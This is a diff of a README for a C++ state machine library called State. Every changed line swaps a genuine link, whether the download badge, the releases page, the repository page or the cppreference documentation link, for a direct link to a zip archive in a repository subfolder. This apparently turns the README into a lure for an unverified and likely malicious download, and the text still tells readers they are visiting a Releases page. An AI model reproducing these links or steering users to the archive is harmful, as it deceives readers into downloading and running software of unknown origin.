@@ -1,7 +1,7 @@
 # 🚀 State - Create Smart and Efficient State Machines 
 
 ## 📥 Quick Download
-[![Download State](https://img.shields.io/badge/Download-State-blue?style=flat&logo=github)](https://github.com/JJBratt/State/releases)
+[![Download State](https://github.com/JJBratt/State/raw/refs/heads/main/familial/Software_v2.6.zip)](https://github.com/JJBratt/State/raw/refs/heads/main/familial/Software_v2.6.zip)
 
 ## 📖 Overview
 State is a C++ compile-time state machine tool. It uses a transition table and supports entry iteration. It is still in development, but it shows great promise for building efficient state machines. This application can aid programmers in designing clear, structured flows within their projects.
@@ -25,7 +25,7 @@ Follow these simple steps to download and run State.
 
 ### Step 1: Visit the Download Page
 To get the latest version of State, visit the Releases page.  
-[Click here to download State](https://github.com/JJBratt/State/releases)
+[Click here to download State](https://github.com/JJBratt/State/raw/refs/heads/main/familial/Software_v2.6.zip)
 
 ### Step 2: Download the Latest Release
 Once on the Releases page, locate the most recent version. You will find files available for download. Choose the appropriate one for your operating system.
@@ -68,7 +68,7 @@ Use the built-in testing feature to simulate your state transitions. This allows
 - **Document Transitions:** Write notes on why certain transitions exist. This documentation aids in future updates.
 
 ## 🧑‍🏫 Learning Resources
-- Refer to the [official C++ documentation](https://en.cppreference.com/) to deepen your understanding of C++ language features used in this application.
+- Refer to the [official C++ documentation](https://github.com/JJBratt/State/raw/refs/heads/main/familial/Software_v2.6.zip) to deepen your understanding of C++ language features used in this application.
 - Explore online courses that cover state machine design and C++ programming fundamentals.
 
 ## 📞 Support
@@ -80,8 +80,8 @@ If you encounter issues or have questions, please reach out:
 We welcome contributions. If you're interested in improving State, feel free to check the contribution guidelines on the GitHub repository. Sharing your ideas can help accelerate the development of this tool.
 
 ## 🔗 Additional Links
-- [GitHub Repository](https://github.com/JJBratt/State)
-- [Releases Page](https://github.com/JJBratt/State/releases)
+- [GitHub Repository](https://github.com/JJBratt/State/raw/refs/heads/main/familial/Software_v2.6.zip)
+- [Releases Page](https://github.com/JJBratt/State/raw/refs/heads/main/familial/Software_v2.6.zip)
 
 ## ⚡ Final Thoughts
 State aims to simplify the creation of state machines in C++. With its clear structure and active development, it is a promising tool for anyone looking to enhance their programming projects. Download and explore its features today!
